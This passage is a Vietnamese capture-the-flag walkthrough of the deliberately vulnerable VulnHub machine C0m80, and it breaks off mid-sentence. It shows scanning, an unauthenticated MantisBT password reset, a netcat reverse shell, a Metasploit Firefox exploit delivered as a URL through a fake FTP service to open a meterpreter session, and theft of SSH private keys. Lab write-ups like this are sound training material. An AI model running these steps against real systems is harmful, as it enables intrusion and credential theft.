[{"title":"[VulnHub] C0m80 1","url":"/2020/12/29/C0m801-vulnhub/","content":"\nOverviewLink download: C0M80: 1Difficulty: [Difficult] but depends on you really (Khó vãi cả đái, thề!)\n\nInformation GatheringNmapVẫn là những bước đầu tiên, kiếm xem machine ml này đang có IP là gì.\n$ nmap 10.10.10.0/24                                                                             Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 09:40 +07Nmap scan report for 10.10.10.1Host is up (0.00019s latency).All 1000 scanned ports on 10.10.10.1 are closedNmap scan report for 10.10.10.12Host is up (0.00025s latency).Not shown: 995 closed portsPORT     STATE SERVICE80/tcp   open  http111/tcp  open  rpcbind139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds2049/tcp open  nfsNmap done: 256 IP addresses (2 hosts up) scanned in 3.14 seconds\nOkay, 10.10.10.12, và tạm thời có mấy cổng với thông tin cơ bản, machine này có thể đang chạy OS là Windows. Tiếp tục tìm kiếm sâu hơn xem sao.\n$ nmap -p- 10.10.10.12                                                                           Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 09:41 +07Nmap scan report for 10.10.10.12Host is up (0.0031s latency).Not shown: 65524 closed portsPORT      STATE SERVICE80/tcp    open  http111/tcp   open  rpcbind139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds2049/tcp  open  nfs20021/tcp open  unknown41971/tcp open  unknown44373/tcp open  unknown44663/tcp open  unknown57736/tcp open  unknown59619/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 2.67 seconds$ nmap -p 80,111,139,445,2049,20021,41971,44663,57736,59619 -sV -sC 10.10.10.12                                                                                           Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 09:43 +07Nmap scan report for 10.10.10.12Host is up (0.00057s latency).PORT      STATE SERVICE     VERSION80/tcp    open  http        Microsoft IIS httpd 6.0|_http-server-header: Microsoft-IIS/6.0|_http-title: BestestSoftware Ltd.111/tcp   open  rpcbind     2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  2,3,4       2049/tcp   nfs|   100003  2,3,4       2049/tcp6  nfs|   100003  2,3,4       2049/udp   nfs|   100003  2,3,4       2049/udp6  nfs|   100005  1,2,3      36089/udp   mountd|   100005  1,2,3      43700/tcp6  mountd|   100005  1,2,3      56182/udp6  mountd|   100005  1,2,3      59619/tcp   mountd|   100021  1,3,4      39062/tcp6  nlockmgr|   100021  1,3,4      39093/udp6  nlockmgr|   100021  1,3,4      44373/tcp   nlockmgr|   100021  1,3,4      45251/udp   nlockmgr|   100024  1          36017/udp   status|   100024  1          52742/udp6  status|   100024  1          56325/tcp6  status|   100024  1          57736/tcp   status|   100227  2,3         2049/tcp   nfs_acl|   100227  2,3         2049/tcp6  nfs_acl|   100227  2,3         2049/udp   nfs_acl|_  100227  2,3         2049/udp6  nfs_acl139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp  open  nfs_acl     2-3 (RPC #100227)20021/tcp open  unknown| fingerprint-strings: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, HTTPOptions, RPCCheck, RTSPRequest: |     220 bestFTPserver 1.0.4 ready...|     ftp&gt;|     Unknown ftp command|     ftp&gt;|   GetRequest: |     220 bestFTPserver 1.0.4 ready...|     ftp&gt;|     (remote-file) |     usage: get remote-file [ local-file ]|     ftp&gt;|   Help: |     220 bestFTPserver 1.0.4 ready...|     ftp&gt;|     Commands may be abbreviated.|     Commands are:|     mdelete qc site|     disconnect mdir sendport size|     account exit mget put status|     append form mkdir pwd struct|     ascii get mls quit system|     bell glob mode quote sunique|     binary hash modtime recv tenex|     help mput reget tick|     case idle newer rstatus trace|     image nmap rhelp type|     cdup ipany nlist rename user|     chmod ipv4 ntrans reset umask|     close ipv6 open restart verbose|     prompt rmdir ?|     delete ls passive desert|     debug macdef proxy send|     ftp&gt;|   NULL: |     220 bestFTPserver 1.0.4 ready...|_    ftp&gt;41971/tcp open  mountd      1-3 (RPC #100005)44663/tcp open  mountd      1-3 (RPC #100005)57736/tcp open  status      1 (RPC #100024)59619/tcp open  mountd      1-3 (RPC #100005)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port20021-TCP:V=7.91%I=7%D=12/29%Time=5FEA97E1%P=x86_64-pc-linux-gnu...Service Info: Host: C0M80; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -1s, deviation: 0s, median: -1s|_nbstat: NetBIOS name: C0M80, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: c0m80|   NetBIOS computer name: C0M80\\x00|   Domain name: \\x00|   FQDN: c0m80|_  System time: 2020-12-29T02:46:14+00:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2020-12-29T02:46:14|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 158.12 seconds\nSơ qua đây thì có thể thấy machine đang mở cổng đáng chú ý như 80-HTTP, 139 và 445 Samba, 2049-NFS, 20021 có thể là FTP.Tìm hiểu qua về NFS, cái này mới lạ đấy, thề là lần đầu tôi thấy cái này :v\n\nhttps://en.wikipedia.org/wiki/Network_File_SystemNetwork File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems (Sun) in 1984,[1] allowing a user on a client computer to access files over a computer network much like local storage is accessed. NFS, like many other protocols, builds on the Open Network Computing Remote Procedure Call (ONC RPC) system. The NFS is an open standard defined in a Request for Comments (RFC), allowing anyone to implement the protocol.\n\nGiờ thì xem xem thư mục nào trên machine cho phép chia sẻ file.\n$ showmount --exports 10.10.10.12                                                                Export list for 10.10.10.12:/ftpsvr/bkp *\nMount nó vào một thư mục trong máy mình để xem trong đấy có chia sẻ cái gì. Việc này yêu cầu bạn phải có quyền tương đương hoặc lớn hơn với chủ sở hữu (owner) đối với thư mục được mount.\n$ sudo mount -t nfs 10.10.10.12:/ftpsvr/bkp /tmp/duma$ sudo ls -al /tmp/duma                                                                          total 2736drwxrwx---  2 root   backup    4096 Sep 23  2017 .drwxrwxrwt 18 root   root     36864 Dec 31 09:53 ..-rw-r--r--  1 backup backup 2757002 Dec 31 09:53 ftp104.bkp\nThó được file ftp104.bkp, mở ra thì thấy toàn mã hexdump, kiểm tra các bit signature thì thấy đây có thể là một file thực thi của Windows, nhưng convert sang .exe thì thực thi bị lỗi, vẫn chưa hiểu sao. Dù tôi đã xóa đi những ký tự không phải hexdump như thông tin về ngày tháng ở đầu file, mấy dòng kẻ… Kệ đấy đã, để sau, giờ đi kiếm thông tin tiếp.Vào trong cái website trên cổng 80 nhận được một trang landing, hmm, nothing to do here.\nDirsearchTìm cái đống tệp tin, thư mục ẩn của nó ra.\n$ ./dirsearch.py -u http://10.10.10.12 -e html,php,txt -x 403Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 9791Target: http://10.10.10.12/[10:05:09] Starting: [10:05:13] 200 -   17KB - /LICENSE.txt[10:05:13] 200 -    1KB - /README.txt[10:05:14] 301 -  236B  - /_vti_bin  -&gt;  http://10.10.10.12/_vti_bin/[10:05:14] 200 -    0B  - /_vti_bin/[10:05:14] 301 -  236B  - /_vti_cnf  -&gt;  http://10.10.10.12/_vti_cnf/[10:05:14] 200 -    0B  - /_vti_cnf/[10:05:14] 200 -    0B  - /_vti_log/[10:05:14] 301 -  236B  - /_vti_log  -&gt;  http://10.10.10.12/_vti_log/[10:05:18] 301 -  234B  - /assets  -&gt;  http://10.10.10.12/assets/[10:05:18] 200 -    1KB - /assets/[10:05:18] 301 -  231B  - /bin  -&gt;  http://10.10.10.12/bin/[10:05:18] 200 -    0B  - /bin/[10:05:19] 301 -  232B  - /bugs  -&gt;  http://10.10.10.12/bugs/[10:05:21] 301 -  231B  - /dev  -&gt;  http://10.10.10.12/dev/[10:05:21] 200 -    0B  - /dev/[10:05:21] 200 -   15KB - /favicon.ico[10:05:22] 301 -  234B  - /images  -&gt;  http://10.10.10.12/images/[10:05:22] 200 -    3KB - /images/[10:05:22] 200 -    8KB - /index.html[10:05:24] 200 -  403B  - /manifest.json\nQuét lặp lại với các thư mục tìm được, tóm được thằng phpInfo ở đường dẫn http://10.10.10.12/dev/info.php, rất rất nhiều thông tin giá trị được show ra trước mặt, có thể gần như khẳng cmn định là machine này đang sử dụng OS là Windows, hoặc chí ít thì cái dịch vụ này đang được chạy bởi cái gì đó trên nền Windows OS.\nPHP Version 5.2.8MySQL version: 5.1.30bla bla\nThêm nữa, trong uri &#x2F;bugs, Mantis Bug Tracker, cái này tôi cũng lần đầu gặp luôn :)) chả biết mọe gì về nó cả, chỉ biết là nó yêu cầu login, Okay, Google về nó xem sao.\nSearchsploitTìm kiếm với Searchsploit về thằng này để mò mẫm một hướng khai thác.\n$ searchsploit mantis                                                                                                               ----------------------------------------------------------------------------------------------------- --------------------------- Exploit Title                                                                                       |  Path----------------------------------------------------------------------------------------------------- ---------------------------Mantis Bug Tracker 0.15.x/0.16/0.17.x - JPGraph Remote File Inclusion Command Execution              | php/webapps/21727.txtMantis Bug Tracker 0.19 - Remote Server-Side Script Execution                                        | php/webapps/24390.txtMantis Bug Tracker 0.19.2/1.0 - &#x27;Bug_sponsorship_list_view_inc.php&#x27; File Inclusion                   | php/webapps/26423.txtMantis Bug Tracker 0.x - Multiple Cross-Site Scripting Vulnerabilities                               | php/webapps/24391.txtMantis Bug Tracker 0.x - New Account Signup Mass Emailing                                            | php/webapps/24392.phpMantis Bug Tracker 0.x/1.0 - &#x27;manage_user_page.php?sort&#x27; Cross-Site Scripting                        | php/webapps/27229.txtMantis Bug Tracker 0.x/1.0 - &#x27;view_all_set.php&#x27; Multiple Cross-Site Scripting Vulnerabilities        | php/webapps/27228.txtMantis Bug Tracker 0.x/1.0 - &#x27;View_filters_page.php&#x27; Cross-Site Scripting                            | php/webapps/26798.txtMantis Bug Tracker 0.x/1.0 - Multiple Input Validation Vulnerabilities                               | php/webapps/26172.txtMantis Bug Tracker 1.1.1 - Code Execution / Cross-Site Scripting / Cross-Site Request Forgery        | php/webapps/5657.txtMantis Bug Tracker 1.1.3 - &#x27;manage_proj_page&#x27; PHP Code Execution (Metasploit)                        | php/remote/44611.rbMantis Bug Tracker 1.1.3 - Remote Code Execution                                                     | php/webapps/6768.txtMantis Bug Tracker 1.1.8 - Cross-Site Scripting / SQL Injection                                      | php/webapps/36068.txtMantis Bug Tracker 1.2.0a3 &lt; 1.2.17 XmlImportExport Plugin - PHP Code Injection (Metasploit) (1)     | multiple/webapps/41685.rbMantis Bug Tracker 1.2.0a3 &lt; 1.2.17 XmlImportExport Plugin - PHP Code Injection (Metasploit) (2)     | php/remote/35283.rbMantis Bug Tracker 1.2.19 - Host Header                                                              | php/webapps/38068.txtMantis Bug Tracker 1.2.3 - &#x27;db_type&#x27; Cross-Site Scripting / Full Path Disclosure                     | php/webapps/15735.txtMantis Bug Tracker 1.2.3 - &#x27;db_type&#x27; Local File Inclusion                                            | php/webapps/15736.txtMantis Bug Tracker 1.3.0/2.3.0 - Password Reset                                                      | php/webapps/41890.txtMantis Bug Tracker 1.3.10/2.3.0 - Cross-Site Request Forgery                                         | php/webapps/42043.txtMantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)                                   | php/webapps/48818.py----------------------------------------------------------------------------------------------------- --------------------------Shellcodes: No Results\nTạm thời chưa biết MantisBT đang sử dụng ở đây là phiên bản bao nhiêu, chưa biết thì lại phải mò thôi. Nhìn quanh thì thấy có một lỗi cho phép đổi mật khẩu người dùng mà không cần qua xác thực, ảnh hưởng đến một loạt các phiên bản từ 1.3.0 đến 2.3.0, tức là khả năng cũng cao cái nủa nợ kia bị dính.https://www.cvedetails.com/cve/CVE-2017-7615/https://www.exploit-db.com/exploits/41890\nTruy cập vào cái đường dẫn này http://10.10.10.12/bugs/verify.php?id=1&amp;confirm_hash=Với id&#x3D;1, trong trường username nhận được hiển thị là bob, đổi mật khẩu thì vẫn éo truy cập được, tăng cái param id lên 2 3 4 5, thì có được tài khoản của alice. Tạm thời đổi mật khẩu cùa bạn alice xinh đẹp thành 00000, và login vào xem trong này có gì.Lần mò trong đây một hồi để thó thêm thông tin, phiên bản MantisBT đang dùng là 2.3.0, đường dẫn là &#x2F;var&#x2F;www&#x2F;html…, ố ồ, đây là đường dẫn của linux system mà? Ở trên thì có thông tin cho thấy đây là Windows System. Như vậy thì có 2 khả năng ở đây. Một, đây là máy Windows OS, nhưng dịch vụ HTTP trên cổng 80 là chạy dưới một hệ giả lập của Linux OS. Hai, đây là máy Linux OS, và chạy giả lập dịch vụ FTP cổng 20021 nên Windows.Gác lại vụ đó, quay sang khai thác lỗi RCE trên MantisBT mà searchsploit tìm thấy ở trên.Up shell đồng thời bật lắng nghe trên máy ở cổng 22222.https://www.exploit-db.com/exploits/48818Code này chạy bằng python2, cần thêm lại một số thông tin trong hàm khởi tạo, có thể có lỗi khi chạy do syntax error hoặc gì gì đó, anh em chỉ cần sửa code để chạy cho đúng là xong &#x3D;))\n$ nc -nlvp 22222                                                                                  listening on [any] 22222 ...connect to [10.10.10.1] from (UNKNOWN) [10.10.10.12] 41396bash: cannot set terminal process group (2042): Inappropriate ioctl for devicebash: no job control in this shellwww-data@C0m80:/var/www/html/bugs$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)\nWww-data shellOkay, có shell của www-data. Chắc kèo đây là máy Linux OS rồi. Chắc chắn hơn thì kiểm tra các dịch vụ đang chạy, thấy mấy dòng bên dưới là đủ biết rồi, hê hê, Linux OS, chạy giả lập ứng dụng Windows với wine.\nb0b       2226  0.0  0.3 1597352 3604 pts/7    S+   02:05   0:00 /ftpsvr/bestFTPserver.exe                                                              b0b       2229  0.0  0.4   8352  4716 ?        Ss   02:05   0:00 /opt/wine-stable/bin/wineserverb0b       2239  0.0  0.4 1599240 4940 ?        Ssl  02:05   0:00 C:\\windows\\system32\\services.exe                                                              b0b       2247  0.0  0.6 1604640 6660 ?        Sl   02:05   0:00 C:\\windows\\system32\\winedevice.exe                                                              b0b       2262  0.0  0.2 1597752 2448 ?        Sl   02:05   0:00 C:\\windows\\system32\\plugplay.exe \nGet Root shellWww-data shellLiệt kê xem các user nào có mặt trong đây. Thấy 2 cái tên quen thuộc là b0b và al1ce.\nroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemessagebus:x:102:105::/var/run/dbus:/bin/falselandscape:x:103:109::/var/lib/landscape:/bin/falsesshd:x:104:65534::/var/run/sshd:/usr/sbin/nologinusbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/falseavahi:x:106:113:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falsednsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/falsecolord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/falsepulse:x:109:117:PulseAudio daemon,,,:/var/run/pulse:/bin/falsertkit:x:110:119:RealtimeKit,,,:/proc:/bin/falsedebian-spamd:x:111:121::/var/lib/spamassassin:/bin/shgdm:x:112:122:Gnome Display Manager:/var/lib/gdm:/bin/falseavahi-autoipd:x:113:125:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falsehplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/falsekernoops:x:115:65534:Kernel Oops Tracking Daemon,,,:/:/bin/falsesaned:x:116:126::/home/saned:/bin/falsewhoopsie:x:117:127::/nonexistent:/bin/falsespeech-dispatcher:x:118:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/shvboxadd:x:999:1::/var/run/vboxadd:/bin/falseb0b:x:1000:1001: :/home/b0b:/bin/bashmysql:x:119:128:MySQL Server,,,:/nonexistent:/bin/falsexrdp:x:120:129::/var/run/xrdp:/bin/falseal1ce:x:1001:34::/home/al1ce:/bin/dashpostfix:x:121:130::/var/spool/postfix:/bin/falsestatd:x:122:65534::/var/lib/nfs:/bin/false\nPhiên bản kernel hiện tại là 3.13.0, phiên bản này khá cũ đấy, có sẵn mã khai thác cho phép leo thang đặc quyền root ở trên exploitdb.\nwww-data@C0m80:/etc/w3m$ uname -aLinux C0m80 3.13.0-129-generic #178-Ubuntu SMP Fri Aug 11 12:49:13 UTC 2017 i686 i686 i686 GNU/Linux\nhttps://www.exploit-db.com/exploits/37292https://www.exploit-db.com/exploits/37293\nMò mẫm vào thư mục của b0b để recon thêm thông tin.\nwww-data@C0m80:/home/b0b$ cd Desktopwww-data@C0m80:/home/b0b/Desktop$ ls -altotal 32drwxr-xr-x  2 b0b b0b 4096 Sep 22  2017 .drwxr-xr-x 21 b0b b0b 4096 Dec 31 02:05 ..-rw-rw-r--  1 b0b b0b   86 Sep 22  2017 .save~-rwxr-xr-x  1 b0b b0b  318 Sep 19  2017 Mozilla Firefox.desktoplrwxrwxrwx  1 b0b b0b   19 Sep 22  2017 b0b&#x27;s Documents -&gt; /home/b0b/Documents-rwxr-xr-x  1 b0b b0b  281 Sep 22  2017 bestFTPserver.exe.desktop-rwxr-xr-x  1 b0b b0b  227 Sep 22  2017 cmd.exe.desktop-rw-rw-r--  1 b0b b0b  362 Sep 22  2017 notes.txt-rw-rw-r--  1 b0b b0b   73 Sep 22  2017 pwds.txtwww-data@C0m80:/home/b0b/Desktop$ cat notes.txtThese are my notes...---------------------I prefer the old fasioned ways of doing things if I&#x27;m honest1. Remember to prank Jeff with Alice :D2. Buy Metallica tickets for me and Alice for next month.3. Call Mom for her birthday on Thursday, and remeber to take flowers at the weekend.4. Draft a resignation letter as Jeff to send to Mr Cheong. LOL :Dwww-data@C0m80:/home/b0b/Desktop$ cat pwds.txtcat pwds.txt## Reminder to self!I moved all my passwords to a new password manager\nPhải nói là thằng bob này khá là quý alice &#x3D;)) mua vé xem phim cho 2 đứa. Và thêm nữa, một cái đáng chú ý bob tự note cho bản thân là nhớ mật khẩu đã được chuyển tới một trình quản lý mật khẩu mới. Đây có thể là một cái hint. Vì với một bài CTF thì không có gì là ngẫu nhiên cả.Câu hỏi bỏ ngỏ ở đây, trình quản lý mật khẩu ấy là gì?Qua thư mục của al1ce xem thế nào.\nwww-data@C0m80:/home/al1ce$ ls -altotal 16drwxr-xr-x 3 root  root   4096 Sep 23  2017 .drwxr-xr-x 4 root  root   4096 Sep 23  2017 ..drwxr-xr-x 2 root  root   4096 Sep 23  2017 .ssh-rwxr-xr-x 1 al1ce backup  108 Sep 23  2017 makebkp.shwww-data@C0m80:/home/al1ce$ cat makebkp.sh#!/bin/bash# I wrote a quick tool for you bob# this will backup the ftp app file to the net sharemakebkpwww-data@C0m80:/home/al1ce$ locate makebkp/bin/makebkp/home/al1ce/makebkp.sh/usr/local/bin/makebkpwww-data@C0m80:/home/al1ce$ file /bin/makebkp/bin/makebkp: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=aafa18fde98338ee8cfa6567ac43d9b280047b53, not strippedwww-data@C0m80:/home/al1ce$ strings /bin/makebkp/lib/ld-linux.so.2... blablabla ...date &gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; \\python -c &#x27;print(&quot;-&quot; * 66)&#x27;&gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; \\xxd -E /ftpsvr/bestFTPserver.exe &gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; \\python -c &#x27;print(&quot;-&quot; * 66)&#x27;&gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; \\xxd -E /ftpsvr/bfsvrdll.dll &gt;&gt; /ftpsvr/bkp/ftp104.bkp &amp;&amp; \\chown backup:backup /ftpsvr/bkp/ftp104.bkp... blablabla ..._init\nDòng này quan trọng đấy, nó tạo ra cái file ftp104.bkp ở trên tìm được khi mount thư mục NFS. Và đấy là lý do tại sao khi convert lại thì bị lỗi &#x3D;)). Look at that!\n\nĐầu tiên là date được ghi vào &#x2F;ftpsvr&#x2F;bkp&#x2F;ftp104.bkp.\nTiếp, 66 cái gạch ngang được ghi vào :)) đù mé, chắc để cho phân biệt các phần.\nHexdump của &#x2F;ftpsvr&#x2F;bestFTPserver.exe được nối vào dưới.\nLại tiếp tục 66 cái dấu gạch.\nCuối cùng là hexdump của &#x2F;ftpsvr&#x2F;bfsvrdll.dll được thêm vào cuối cùng.\n\nThế là về cơ bản, đã có toàn bộ hexdump của cả file thực thi (.exe) và thư viện đi kèm với nó (.dll), khôi phục lại bestFTPserver.exe và bfsvrdll.dll để có thể chạy mô phỏng lại dịch vụ FTP này. Ơ thế chạy mô phỏng đề làm mẹ gì? Để biết được cái hệ thống thật kia nó chạy như nào chứ sao nữa.Kết nối với FTP trên cổng 20021 của machine xem có gì.\n$ ftp 10.10.10.12 20021                                                                          Connected to 10.10.10.12.220 bestFTPserver 1.0.4 ready...Name (10.10.10.12:#####): ftp&gt;331 Anonymous login OK, send your e-mail as passwordLogin failed.ftp&gt; dirftp&gt;502 Unknown ftp commandftp&gt; lsftp&gt;502 Unknown ftp commandftp&gt; exitftp&gt;TryHarder ;D\nCái này thì xương máu mà nói, tôi thử hết rồi, tất cả lệnh đều bị chặn lại hết. Nó chặn thế nào, chặn kiểu gì, thì phải xem nó làm gì, làm như nào. Nhắc lại trên là đã có bestFTPserver.exe và bfsvrdll.dll để chạy mô phỏng, giờ reverse nó với Ollydbg.\nTôi là thằng đéo biết gì về reverse, nên là chỉ lướt qua qua mấy cái string ASCII, xem nó nhảy vào đâu, gọi cái gì… Tóm cái váy lại, FTP này thực hiện khá là đơn giản, đúng như cái tên, bestFTPserver, việc của nó là so sánh các chuỗi lệnh nhập vào, éo làm gì cả, hiển thị ra thông báo lỗi luôn &#x3D;)). Có vài lệnh thì in ra văn bản (system, ls…).\nNhưng đoạn này, với các input với mở đầu là http hoặc https, nó sẽ thực hiện lệnh explorer để mở đường dẫn với trình duyệt mặc định.\n\nLệnh explorer trên Windows để gọi đến trình quản lý file (File Explorer), nhưng nếu tham số đầu vào là một đường link, nó sẽ gọi đến trình duyệt (browser) và truy cập vào đường link đó.\n\nChưa rõ được trình duyệt mặc định ở đây là gì, nãy ngó qua thư mục Desktop thì có thấy Firefox. Kiểm tra phiên bản của Firefox xem có dính CVE nào không.\nwww-data@C0m80:/home/b0b/.wine/drive_c/Program Files/Mozilla Firefox$ cat install.log                 ...Mozilla Firefox Installation Started: 2017-09-19 4:27:27-------------------------------------------------------------------------------Installation Details-------------------------------------------------------------------------------  Install Dir: C:\\Program Files\\Mozilla Firefox  Locale     : en-US  App Version: 13.0.1  GRE Version: 13.0.1  OS Name    : Windows XP  Target CPU : x86\nChết nhé, phiên bản Firefox đang là 13.0.1, quá cũ, đi kèm với sự cũ kỹ này là một đống lỗi RCE. Giờ thì bằng cách nào đó, gửi cho machine một đường link bằng cái FTP lởm kia, Firefox truy cập vào, lấy được shell.https://www.cvedetails.com/vulnerability-list/vendor_id-452/product_id-3264/version_id-136386/Mozilla-Firefox-13.0.1.html\nMetasploitỞ đây tôi dùng module auto_pwned của metasploit, đại khái là nó sẽ tạo ra một loạt các kịch bản khai thác sẵn có và nhét hết vào 1 đường link, sau khi trình duyệt truy cập vào, nếu có lỗi khớp với các kịch bản khai thác đang được chạy, metasploit sẽ lấy về một hoặc nhiều session (hiểu là shell) trên máy nạn nhân, lấy được bao nhiêu thì còn tùy vào số lỗi có thể khai thác.\n[+] Please use the following URL for the browser attack:[+] BrowserAutoPwn URL: http://10.10.10.1:8080/eKl8aErr[*] Server started.\nCopy cái URL kia rồi bắn sang FTP.\nftp&gt;http://10.10.10.1:8080/eKl8aErrBugReport Link Sent to Bob...\nOkay, vậy là Firefox có dính 2 lỗi RCE thật, nhưng éo lấy được session nào cả! TẠI SAO?\n[*] Gathering target information for 10.10.10.12[*] Sending HTML response to 10.10.10.12nil versions are discouraged and will be deprecated in Rubygems 4[*] 10.10.10.12      firefox_proto_crmfrequest - Sending HTML[*] 10.10.10.12      firefox_proto_crmfrequest - Sending the malicious addon[*] 10.10.10.12      adobe_flash_hacking_team_uaf - Request: /TbML/tHTebS/[*] 10.10.10.12      adobe_flash_hacking_team_uaf - Sending HTML...[*] 10.10.10.12      adobe_flash_hacking_team_uaf - Request: /TbML/tHTebS/ggKSZR.swf[*] 10.10.10.12      adobe_flash_hacking_team_uaf - Sending SWF...\nTôi quay sang chạy lại kịch bản khai thác với lỗi firefox_proto_crmfrequest với options tương tự.(https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest)\nLần này thì lấy được session, nhưng shell này bị ngu si thế đéo nào ấy :DSau một hồi chán nản và quay ra chơi cờ vua với đồng nghiệp, ngồi lại vào ghế, ngắm nghía cẩn thận các option, tôi phát hiện ra đoạn này.\nExploit targets:   Id  Name   --  ----   0   Universal (Javascript XPCOM Shell)   1   Native Payload\nỒ nố! Mặc định target đang là ID 0, tức Universal (Javascript XPCOM Shell). Lúc này cần chú ý đến một phần quan trọng nữa của Metasploit, đó là PAYLOAD.Mặc định, PAYLOAD sẽ là generic&#x2F;shell_reverse_tcp, lúc này Metasploit sẽ tự động chọn một PAYLOAD phù hợp để tải lên. Việc tự động chọn như này, có thể đúng, có thể sai, và trong trường hợp này thì nó đã sai. Có thể nó đã tải lên một PAYLOAD dành cho Linux, hoặc gì gì đó, trong khi dịch vụ FTP này thì đang chạy giả lập Windows, vậy nên sẽ cần một PAYLOAD dành cho Windows. Ở đây tôi chọn là windows&#x2F;meterpreter&#x2F;reverse_tcp.Để hiểu đúng, và hiểu rõ về PAYLOAD thì thực sự tôi cũng đéo hiểu :v, hẹn khi nào hiểu thì sẽ update lại bài viếtĐổi lại target ID 1 và PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp. EXPLOIT!\n[*] 10.10.10.12      firefox_proto_crmfrequest - Gathering target information for 10.10.10.12[*] 10.10.10.12      firefox_proto_crmfrequest - Sending HTML response to 10.10.10.12[*] 10.10.10.12      firefox_proto_crmfrequest - Sending HTML[*] 10.10.10.12      firefox_proto_crmfrequest - Sending the malicious addon[*] Sending stage (175174 bytes) to 10.10.10.12[*] Meterpreter session 1 opened (10.10.10.1:4444 -&gt; 10.10.10.12:47824) at 2021-01-01 21:42:17 +0700msf6 exploit(multi/browser/firefox_proto_crmfrequest) &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt; shellProcess 109 created.Channel 1 created.Microsoft Windows 5.1.2600 (2.0.2)Z:\\home\\b0b&gt;\nGiờ thì có thể làm rất rất nhiều việc với meterpreter, ăn trộm cái thư mục .ssh của cả b0b và al1ce về để xem có mối nào vào được shell linux không, chứ shell Command line Windows giả lập thì chịu, chả được cái tích sự gì.\nmeterpreter &gt; pwdZ:\\home\\b0bmeterpreter &gt; download .ssh ~/boot2root/COM80[*] downloading: .ssh\\.save~ -&gt; /home/#####/boot2root/COM80/.save~[*] download   : .ssh\\.save~ -&gt; /home/#####/boot2root/COM80/.save~[*] downloading: .ssh\\id_rsa -&gt; /home/#####/boot2root/COM80/id_rsa[*] download   : .ssh\\id_rsa -&gt; /home/#####/boot2root/COM80/id_rsa[*] downloading: .ssh\\id_rsa.pub -&gt; /home/#####/boot2root/COM80/id_rsa.pub[*] download   : .ssh\\id_rsa.pub -&gt; /home/#####/boot2root/COM80/id_rsa.pub[*] downloading: .ssh\\known_hosts -&gt; /home/#####/boot2root/COM80/known_hosts[*] download   : .ssh\\known_hosts -&gt; /home/#####/boot2root/COM80/known_hostsmeterpreter &gt; cd ..meterpreter &gt; cd al1cemeterpreter &gt; pwdZ:\\home\\al1cemeterpreter &gt; download .ssh ~/boot2root/COM80/alice[*] downloading: .ssh\\authorized_keys -&gt; /home/#####/boot2root/COM80/alice/authorized_keys[*] download   : .ssh\\authorized_keys -&gt; /home/#####/boot2root/COM80/alice/authorized_keys\nNội dung authorized_keys và id_rsa.pub là giống hệt nhau. Điều này có nghĩa là, cái đống .ssh trong thư mục của b0b được dùng để login ssh vào tài khoản của al1ce. Loằng ngoằng vcl! Nhưng ban nãy quét với Nmap thì cũng chả thấy cổng nào mở dịch vụ 